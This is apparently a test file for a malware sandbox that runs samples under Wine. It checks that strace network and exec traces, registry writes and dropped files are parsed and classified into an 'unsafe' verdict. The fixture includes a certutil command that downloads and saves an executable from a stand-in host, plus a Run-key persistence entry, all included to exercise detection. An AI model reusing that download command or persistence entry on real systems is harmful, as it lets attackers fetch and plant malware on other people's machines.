import test from 'node:test';
import assert from 'node:assert/strict';
import { parseWineOutput } from '../wine-evidence.mjs';
import { classify, computeVerdict } from '../verdict.mjs';

const N = 'abc123', M = `@@NEORA:${N} `;
const WINE_BOOT_DNS = [
  '5:32    connect(5, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("108.61.10.10")}, 16) = -1 ENETUNREACH (Network is unreachable)',
];
// Shapes copied from a real run on the server (strace -f -o: "<line>:<pid>  syscall(...)").
const fixture = (extra = {}) => [
  M + 'META wine=wine-8.0_(Debian_8.0~repack-4) exit= ended=window run_s=30 trace=1',
  M + 'NET',
  ...WINE_BOOT_DNS,
  '90:75    connect(9, {sa_family=AF_UNIX, sun_path="/tmp/.wine-65534/server"}, 20) = 0',
  '91:88    connect(9, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.9")}, 16) = -1 ENETUNREACH (Network is unreachable)',
  '92:88    sendto(9, "x", 1, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = -1 ENETUNREACH',
  '93:88    connect(9, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("127.0.0.1")}, 16) = -1 ECONNREFUSED',
  M + 'EXEC',
  '1:28    execve("/usr/bin/wine", ["wine", "C:\\\\sample\\\\evil.exe"], 0x7ffc /* 12 vars */) = 0',
  '2:29    execve("/usr/lib/wine/wineserver64", ["/usr/lib/wine/wineserver64", "-p0"], 0xffae /* 14 vars */) = 0',
  '3:32    execve("/usr/lib/wine/wine64", ["/usr/lib/wine/wine64", "C:\\\\windows\\\\system32\\\\wineboot.exe", "--init"], 0x7eb1 /* 16 vars */) = 0',
  '4:36    execve("/usr/lib/wine/wine64", ["/usr/lib/wine/wine64", "C:\\\\windows\\\\system32\\\\services.exe"], 0x9da6 /* 16 vars */) = 0',
  '50:75    execve("/usr/lib/wine/wine64", ["/usr/lib/wine/wine64", "C:\\\\sample\\\\evil.exe"], 0x7eb4 /* 16 vars */) = 0',
  '95:80    execve("/usr/lib/wine/wine64", ["/usr/lib/wine/wine64", "C:\\\\windows\\\\system32\\\\cmd.exe", "/c", "certutil -urlcache -f http://x/a.exe a.exe"], 0x7e /* 16 vars */) = 0',
  M + 'REG',
  '[Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run] 1700000000',
  '"upd"="C:\\\\\\\\users\\\\\\\\nobody\\\\\\\\a.exe"',
  '[Software\\\\Wine\\\\Fonts] 1700000001',
  '"x"="y"',
  '[System\\\\CurrentControlSet\\\\Control\\\\ComputerName\\\\ComputerName] 1794055258',
  '"ComputerName"="D08D771BC087"',
  '[Volatile Environment] 1794055260',
  '"USERDOMAIN"="D08D771BC087"',
  M + 'FILES',
  '> ./users/nobody/AppData/Roaming/dropped.exe',
  M + 'STDERR',
  M + 'END',
].join('\n');

test('wine evidence: startup DNS and Wine internals are ignored; sample network, spawn, persistence and drops are kept', () => {
  const r = parseWineOutput(fixture(), N, 'wine:run:evil.exe', 'evil.exe');
  assert.ok(r.meta && r.complete);
  assert.equal(r.meta.ended, 'window'); assert.equal(r.meta.exit, null); assert.equal(r.meta.trace, true);
  const t = (x) => r.events.filter((e) => e.t === x);
  assert.deepEqual(t('net.connect').map((e) => e.d), ['203.0.113.9:443']);
  assert.deepEqual(t('dns.lookup').map((e) => e.d), ['8.8.8.8:53']);   // wineboot's own 108.61.10.10 probe is not blamed on the sample
  assert.equal(t('proc.spawn').length, 1);
  assert.match(t('proc.spawn')[0].d, /certutil/);
  assert.equal(t('fs.persist').length, 1);
  assert.equal(t('reg.write').length, 0);                              // Wine/ComputerName/Volatile Environment noise dropped
  assert.match(t('fs.write')[0].d, /dropped\.exe/);
  const f = classify({ events: r.events, runs: [{ what: 'wine:run:evil.exe', started: true, timedOut: true }], kind: 'file', name: 'evil.exe' });
  const ids = f.map((x) => x.id);
  assert.ok(ids.includes('persistence') && ids.includes('import_net') && ids.includes('import_download') && ids.includes('run_timeout'));
  assert.equal(computeVerdict(f, false, { notRun: true }).level, 'unsafe');
});

test('wine evidence: a harmless program that exits normally produces no findings', () => {
  const quiet = [
    M + 'META wine=wine-8.0 exit=0 ended=exited run_s=20 trace=1',
    M + 'NET', ...WINE_BOOT_DNS,
    M + 'EXEC',
    '50:75    execve("/usr/lib/wine/wine64", ["/usr/lib/wine/wine64", "C:\\\\sample\\\\hostname.exe"], 0x7eb4 /* 16 vars */) = 0',
    M + 'REG', '[System\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters] 1794055258', '"Hostname"="d08d771bc087"',
    M + 'FILES', M + 'STDOUT', 'D08D771BC087', M + 'STDERR', M + 'END',
  ].join('\n');
  const r = parseWineOutput(quiet, N, 'wine:run:hostname.exe', 'hostname.exe');
  assert.equal(r.meta.ended, 'exited'); assert.equal(r.meta.exit, 0);
  assert.deepEqual(r.events.map((e) => e.t), ['wine.output']);
  assert.equal(classify({ events: r.events, runs: [], kind: 'file', name: 'hostname.exe' }).length, 0);
});

test('wine evidence: marker lines printed by the sample (wrong nonce) cannot forge sections', () => {
  const r = parseWineOutput(fixture() + '\n@@NEORA:zzz META wine=x exit=0 ended=exited run_s=1 trace=1', N, 'wine:run:evil.exe', 'evil.exe');
  assert.equal(r.meta.ended, 'window');
});

test('wine evidence: missing META (script failed) means "not started"', () => {
  const r = parseWineOutput(`${M}FAIL\nprefix copy failed\n${M}END`, N, 'wine:run:x.exe', 'x.exe');
  assert.equal(r.meta, null); assert.match(r.failure, /prefix copy failed/);
  assert.equal(parseWineOutput('', N, 'w', 'x').meta, null);
});
